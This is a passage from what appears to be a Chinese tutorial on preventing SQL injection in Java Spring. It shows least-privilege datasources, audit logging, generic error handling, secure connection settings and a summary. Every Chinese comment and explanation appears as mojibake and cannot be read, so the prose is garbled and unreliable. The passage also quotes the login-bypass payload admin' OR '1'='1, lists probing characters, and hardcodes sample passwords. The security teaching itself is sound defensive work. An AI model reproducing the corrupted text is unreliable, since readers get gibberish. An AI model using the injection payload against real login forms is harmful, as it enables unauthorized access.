@Configuration
public class DatabaseConfig {
    
    // åªè¯»æ•°æ®æº
    @Bean("readOnlyDataSource")
    public DataSource readOnlyDataSource() {
        HikariDataSource dataSource = new HikariDataSource();
        dataSource.setJdbcUrl("jdbc:mysql://localhost:3306/myapp");
        dataSource.setUsername("app_read");
        dataSource.setPassword("strong_password_1");
        dataSource.setReadOnly(true); // æ ‡è®°ä¸ºåªè¯»
        return dataSource;
    }
    
    // è¯»å†™æ•°æ®æº
    @Bean("readWriteDataSource")
    public DataSource readWriteDataSource() {
        HikariDataSource dataSource = new HikariDataSource();
        dataSource.setJdbcUrl("jdbc:mysql://localhost:3306/myapp");
        dataSource.setUsername("app_write");
        dataSource.setPassword("strong_password_2");
        return dataSource;
    }
}

// æœåŠ¡å±‚ä½¿ç”¨ä¸åŒæ•°æ®æº
@Service
public class UserService {
    
    @Autowired
    @Qualifier("readOnlyDataSource")
    private DataSource readOnlyDataSource;
    
    @Autowired
    @Qualifier("readWriteDataSource")
    private DataSource readWriteDataSource;
    
    // æŸ¥è¯¢æ“ä½œä½¿ç”¨åªè¯»æ•°æ®æº
    public List<User> getAllUsers() {
        // ä½¿ç”¨ readOnlyDataSource
    }
    
    // ä¿®æ”¹æ“ä½œä½¿ç”¨è¯»å†™æ•°æ®æº
    public void updateUser(User user) {
        // ä½¿ç”¨ readWriteDataSource
    }
}
```

### 7.2 æ•æ„Ÿæ“ä½œå®¡è®¡


**ğŸ“‹ æ“ä½œæ—¥å¿—è®°å½•**

```java
@Component
public class DatabaseAuditLogger {
    
    private static final Logger auditLog = LoggerFactory.getLogger("DB_AUDIT");
    
    // è®°å½•æ•æ„Ÿæ“ä½œ
    public void logSensitiveOperation(String operation, String user, String details) {
        String logEntry = String.format(
            "[%s] User: %s, Operation: %s, Details: %s, IP: %s",
            LocalDateTime.now(),
            user,
            operation,
            details,
            getCurrentUserIP()
        );
        
        auditLog.info(logEntry);
        
        // å…³é”®æ“ä½œè¿˜è¦å­˜å…¥æ•°æ®åº“
        if (isCriticalOperation(operation)) {
            saveAuditToDatabase(operation, user, details);
        }
    }
    
    private boolean isCriticalOperation(String operation) {
        Set<String> criticalOps = Set.of(
            "DELETE_USER", "UPDATE_PERMISSION", "BULK_DELETE", 
            "SCHEMA_CHANGE", "BACKUP_RESTORE"
        );
        return criticalOps.contains(operation);
    }
}

// ä½¿ç”¨AOPè‡ªåŠ¨è®°å½•
@Aspect
@Component
public class DatabaseAuditAspect {
    
    @Autowired
    private DatabaseAuditLogger auditLogger;
    
    @Around("@annotation(Auditable)")
    public Object auditDatabaseOperation(ProceedingJoinPoint joinPoint) throws Throwable {
        String methodName = joinPoint.getSignature().getName();
        String userName = getCurrentUser();
        
        try {
            Object result = joinPoint.proceed();
            auditLogger.logSensitiveOperation(methodName, userName, "SUCCESS");
            return result;
        } catch (Exception e) {
            auditLogger.logSensitiveOperation(methodName, userName, "FAILED: " + e.getMessage());
            throw e;
        }
    }
}
```

### 7.3 é”™è¯¯ä¿¡æ¯éšè—


**ğŸ”’ å®‰å…¨çš„é”™è¯¯å¤„ç†**

```java
@ControllerAdvice
public class SecureExceptionHandler {
    
    private static final Logger logger = LoggerFactory.getLogger(SecureExceptionHandler.class);
    
    // SQLå¼‚å¸¸å¤„ç†
    @ExceptionHandler(SQLException.class)
    public ResponseEntity<ErrorResponse> handleSQLException(SQLException e) {
        // è®°å½•è¯¦ç»†é”™è¯¯ï¼ˆä»…æœåŠ¡å™¨ç«¯ï¼‰
        logger.error("SQL Error: {}", e.getMessage(), e);
        
        // è¿”å›æ¨¡ç³Šé”™è¯¯ä¿¡æ¯ï¼ˆç»™å®¢æˆ·ç«¯ï¼‰
        ErrorResponse response = new ErrorResponse(
            "SYSTEM_ERROR",
            "ç³»ç»Ÿæš‚æ—¶ä¸å¯ç”¨ï¼Œè¯·ç¨åé‡è¯•"
        );
        
        return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(response);
    }
    
    // æ•°æ®è®¿é—®å¼‚å¸¸
    @ExceptionHandler(DataAccessException.class)
    public ResponseEntity<ErrorResponse> handleDataAccessException(DataAccessException e) {
        logger.error("Data Access Error: {}", e.getMessage(), e);
        
        // ä¸æš´éœ²å…·ä½“çš„æ•°æ®åº“é”™è¯¯
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
            .body(new ErrorResponse("DATA_ERROR", "æ•°æ®æ“ä½œå¤±è´¥"));
    }
    
    // å‚æ•°éªŒè¯å¼‚å¸¸
    @ExceptionHandler(ValidationException.class)
    public ResponseEntity<ErrorResponse> handleValidationException(ValidationException e) {
        // éªŒè¯é”™è¯¯å¯ä»¥è¿”å›å…·ä½“ä¿¡æ¯
        return ResponseEntity.status(HttpStatus.BAD_REQUEST)
            .body(new ErrorResponse("VALIDATION_ERROR", e.getMessage()));
    }
}
```

### 7.4 æ•°æ®åº“è¿æ¥å®‰å…¨


**ğŸ” å®‰å…¨è¿æ¥é…ç½®**

```properties
# application.properties - å®‰å…¨é…ç½®ç¤ºä¾‹
# ä½¿ç”¨SSLè¿æ¥
spring.datasource.url=jdbc:mysql://localhost:3306/myapp?useSSL=true&requireSSL=true&verifyServerCertificate=true

# è¿æ¥æ± å®‰å…¨é…ç½®
spring.datasource.hikari.maximum-pool-size=20
spring.datasource.hikari.minimum-idle=5
spring.datasource.hikari.connection-timeout=30000
spring.datasource.hikari.idle-timeout=600000
spring.datasource.hikari.max-lifetime=1800000

# ç¦ç”¨å±é™©åŠŸèƒ½
spring.datasource.hikari.data-source-properties.allowLoadLocalInfile=false
spring.datasource.hikari.data-source-properties.allowUrlInLocalInfile=false
spring.datasource.hikari.data-source-properties.allowMultiQueries=false

# å­—ç¬¦é›†å®‰å…¨è®¾ç½®
spring.datasource.hikari.data-source-properties.characterEncoding=utf8mb4
spring.datasource.hikari.data-source-properties.useUnicode=true
```

---

## 8. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 8.1 å¿…é¡»æŒæ¡çš„é˜²æŠ¤è¦ç‚¹


```
ğŸ”¸ SQLæ³¨å…¥æœ¬è´¨ï¼šç”¨æˆ·è¾“å…¥æ”¹å˜äº†SQLè¯­å¥çš„ç»“æ„å’Œé€»è¾‘
ğŸ”¸ é˜²æŠ¤æ ¸å¿ƒï¼šå‚æ•°åŒ–æŸ¥è¯¢ï¼Œæ°¸è¿œä¸è¦æ‹¼æ¥ç”¨æˆ·è¾“å…¥åˆ°SQLä¸­
ğŸ”¸ è¾“å…¥éªŒè¯ï¼šç™½åå•ç­–ç•¥ï¼Œé•¿åº¦é™åˆ¶ï¼Œç±»å‹æ ¡éªŒï¼Œç‰¹æ®Šå­—ç¬¦è¿‡æ»¤
ğŸ”¸ æƒé™æ§åˆ¶ï¼šæœ€å°æƒé™åŸåˆ™ï¼Œç”¨æˆ·åˆ†ç¦»ï¼Œæ“ä½œå®¡è®¡
ğŸ”¸ é”™è¯¯å¤„ç†ï¼šéšè—æ•æ„Ÿä¿¡æ¯ï¼Œè®°å½•è¯¦ç»†æ—¥å¿—ï¼Œè¿”å›é€šç”¨é”™è¯¯
```

### 8.2 å…³é”®ç†è§£è¦ç‚¹


**ğŸ”¹ ä¸ºä»€ä¹ˆå‚æ•°åŒ–æŸ¥è¯¢èƒ½é˜²æ³¨å…¥**
```
åŸç†è§£é‡Šï¼š
- å‚æ•°åŒ–æŸ¥è¯¢å…ˆç¼–è¯‘SQLç»“æ„ï¼Œå†ç»‘å®šå‚æ•°å€¼
- ç”¨æˆ·è¾“å…¥åªèƒ½å½±å“å‚æ•°å€¼ï¼Œæ— æ³•æ”¹å˜SQLç»“æ„
- å³ä½¿è¾“å…¥åŒ…å«SQLè¯­æ³•ï¼Œä¹Ÿåªä¼šè¢«å½“ä½œæ™®é€šå­—ç¬¦ä¸²å¤„ç†

å®é™…æ•ˆæœï¼š
ç”¨æˆ·è¾“å…¥ï¼šadmin' OR '1'='1
åœ¨å‚æ•°åŒ–æŸ¥è¯¢ä¸­è¢«å¤„ç†ä¸ºï¼šusername = "admin' OR '1'='1"ï¼ˆæ•´ä¸ªå­—ç¬¦ä¸²ï¼‰
è€Œä¸æ˜¯ï¼šusername = 'admin' OR '1'='1'ï¼ˆSQLé€»è¾‘ï¼‰
```

**ğŸ”¹ ä¸ºä»€ä¹ˆéœ€è¦å¤šå±‚é˜²æŠ¤**
```
é˜²æŠ¤æ€ç»´ï¼š
- è¾“å…¥éªŒè¯ï¼šç¬¬ä¸€é“é˜²çº¿ï¼Œæ‹’ç»æ˜æ˜¾çš„æ¶æ„è¾“å…¥
- å‚æ•°åŒ–æŸ¥è¯¢ï¼šæ ¸å¿ƒé˜²æŠ¤ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³æ³¨å…¥é—®é¢˜
- æƒé™æ§åˆ¶ï¼šæœ€åé˜²çº¿ï¼Œé™åˆ¶æ”»å‡»å½±å“èŒƒå›´
- é”™è¯¯å¤„ç†ï¼šä¿¡æ¯å®‰å…¨ï¼Œä¸ç»™æ”»å‡»è€…æ›´å¤šçº¿ç´¢

æ·±åº¦é˜²å¾¡ï¼š
æ¯ä¸€å±‚éƒ½å¯èƒ½æœ‰ç–æ¼ï¼Œå¤šå±‚é˜²æŠ¤ç¡®ä¿å³ä½¿æŸå±‚å¤±æ•ˆï¼Œ
å…¶ä»–å±‚ä»èƒ½æä¾›ä¿æŠ¤
```

### 8.3 å®é™…åº”ç”¨æŒ‡å¯¼


**âœ… ç«‹å³è¡ŒåŠ¨æ¸…å•**
- [ ] æ£€æŸ¥ç°æœ‰ä»£ç ï¼Œå°†æ‰€æœ‰SQLæ‹¼æ¥æ”¹ä¸ºå‚æ•°åŒ–æŸ¥è¯¢
- [ ] å®æ–½è¾“å…¥éªŒè¯ï¼Œå»ºç«‹ç™½åå•è§„åˆ™
- [ ] é…ç½®æ•°æ®åº“ç”¨æˆ·æƒé™ï¼Œéµå¾ªæœ€å°æƒé™åŸåˆ™
- [ ] æ·»åŠ æ“ä½œå®¡è®¡æ—¥å¿—ï¼Œç›‘æ§æ•æ„Ÿæ“ä½œ
- [ ] éšè—æ•°æ®åº“é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ä¿¡æ¯æ³„éœ²

**ğŸš¨ å¸¸è§é”™è¯¯é¿å…**
- âŒ è®¤ä¸ºä½¿ç”¨äº†ORMå°±ç»å¯¹å®‰å…¨ï¼ˆä»éœ€æ³¨æ„åŸç”ŸSQLï¼‰
- âŒ åªåšé»‘åå•è¿‡æ»¤ï¼Œå®¹æ˜“è¢«ç»•è¿‡
- âŒ åœ¨å‰ç«¯åšè¾“å…¥éªŒè¯ï¼Œåç«¯ä¸éªŒè¯
- âŒ æ‰€æœ‰æ“ä½œä½¿ç”¨åŒä¸€ä¸ªé«˜æƒé™æ•°æ®åº“ç”¨æˆ·
- âŒ ç›´æ¥å‘ç”¨æˆ·æ˜¾ç¤ºæ•°æ®åº“é”™è¯¯ä¿¡æ¯

### 8.4 æ£€æµ‹ä¸é˜²æŠ¤å·¥å…·


**ğŸ” æ³¨å…¥æ£€æµ‹æ–¹æ³•**
```
æ‰‹å·¥æµ‹è¯•ï¼š
- åœ¨è¾“å…¥æ¡†ä¸­å°è¯• ' " ; -- /**/ ç­‰ç‰¹æ®Šå­—ç¬¦
- è§‚å¯Ÿåº”ç”¨ç¨‹åºçš„é”™è¯¯å“åº”
- æµ‹è¯•æ˜¯å¦èƒ½å¤Ÿç»•è¿‡ç™»å½•éªŒè¯

è‡ªåŠ¨åŒ–å·¥å…·ï¼š
- SQLMapï¼šä¸“ä¸šçš„SQLæ³¨å…¥æ£€æµ‹å·¥å…·
- Burp Suiteï¼šWebå®‰å…¨æµ‹è¯•å¹³å°
- OWASP ZAPï¼šå¼€æºå®‰å…¨æ‰«æå™¨

ä»£ç å®¡è®¡ï¼š
- æœç´¢å…³é”®è¯ï¼šString sql, executeQuery, createQuery
- æ£€æŸ¥æ˜¯å¦ä½¿ç”¨äº†å­—ç¬¦ä¸²æ‹¼æ¥
- éªŒè¯æ˜¯å¦æ‰€æœ‰ç”¨æˆ·è¾“å…¥éƒ½ç»è¿‡äº†éªŒè¯
```

**æ ¸å¿ƒè®°å¿†**ï¼š
- SQLæ³¨å…¥é˜²æŠ¤çš„æ ¸å¿ƒæ˜¯å‚æ•°åŒ–æŸ¥è¯¢ï¼Œç»ä¸æ‹¼æ¥ç”¨æˆ·è¾“å…¥
- è¾“å…¥éªŒè¯è¦ç”¨ç™½åå•æ€ç»´ï¼Œé»˜è®¤æ‹’ç»ã€æ˜ç¡®å…è®¸
- æ•°æ®åº“æƒé™è¦æœ€å°åŒ–ï¼Œä¸åŒæ“ä½œä½¿ç”¨ä¸åŒæƒé™ç”¨æˆ·
- é”™è¯¯ä¿¡æ¯è¦ä¿æŠ¤ï¼Œè¯¦ç»†è®°å½•ä½†ä¸æš´éœ²ç»™æ”»å‡»è€…